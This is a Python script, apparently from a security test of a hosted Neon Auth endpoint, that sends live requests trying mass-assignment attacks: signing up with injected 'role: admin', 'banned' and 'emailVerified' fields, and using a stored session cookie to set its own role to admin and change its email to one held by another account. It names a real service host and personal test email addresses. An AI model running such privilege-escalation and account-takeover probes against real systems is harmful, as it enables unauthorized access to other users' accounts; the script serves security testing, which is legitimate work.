# -*- coding: utf-8 -*-
"""Neon Auth 用户面:sign-up 字段注入 + update-user email 逻辑"""
import http.client, ssl, json, time

ctx = ssl.create_default_context()
NA = 'ep-crimson-fog-w2gucld1.neonauth.us-east-2.aws.neon.build'
ORIGIN = 'http://localhost:3000'
s = json.load(open('_na_sess.json'))
ck1 = s['ck1']

def req(method, path, body=None, cookie=None, origin=ORIGIN):
    try:
        conn = http.client.HTTPSConnection(NA, context=ctx, timeout=25)
        h = {'User-Agent': 'Mozilla/5.0', 'Accept': 'application/json', 'Content-Type': 'application/json'}
        if origin:
            h['Origin'] = origin
        if cookie:
            h['Cookie'] = cookie
        conn.request(method, path, body=json.dumps(body).encode() if body is not None else None, headers=h)
        r = conn.getresponse(); raw = r.read()
        st = r.status
        sc = r.headers.get_all('Set-Cookie') if r.headers else None
        conn.close()
        return st, raw[:500], sc
    except Exception as e:
        return 0, str(e).encode()[:120], None

def show(tag, r, n=400):
    st, raw, sc = r
    print('[%s] -> %d | %s' % (tag, st, raw.decode(errors='replace')[:n]), flush=True)
    time.sleep(0.8)

# 1) sign-up 字段注入:尝试 role/banned/emailVerified/id
show('signup role=admin inject', req('POST', '/neondb/auth/sign-up/email', {
    'email': 'libobo1229+na4@gmail.com', 'password': 'SecTest!2026pass4', 'name': 'sec-na-4',
    'role': 'admin', 'banned': True, 'emailVerified': True}))
show('signup dup email na1', req('POST', '/neondb/auth/sign-up/email', {
    'email': 'libobo1229+na1@gmail.com', 'password': 'SecTest!2026passX', 'name': 'dup'}))

# 2) update-user:字段白名单与 email 冲突
# 2a 改 email 为已存在(na2)的
show('na1 update-user email->na2', req('POST', '/neondb/auth/update-user',
    {'email': 'libobo1229+na2@gmail.com', 'name': 'sec-na-1'}, cookie=ck1))
# 2b 改 role/banned/id
show('na1 update-user role=admin', req('POST', '/neondb/auth/update-user',
    {'role': 'admin', 'banned': False}, cookie=ck1))
# 2c 改 email 为新地址(未占用)
show('na1 update-user email->new', req('POST', '/neondb/auth/update-user',
    {'email': 'libobo1229+na9@gmail.com'}, cookie=ck1))
# 2d 确认当前 session 用户信息
show('na1 get-session', req('GET', '/neondb/auth/get-session', cookie=ck1))
# 2e 还原 email
show('na1 update-user email->restore', req('POST', '/neondb/auth/update-user',
    {'email': 'libobo1229+na1@gmail.com'}, cookie=ck1))

print('DONE', flush=True)
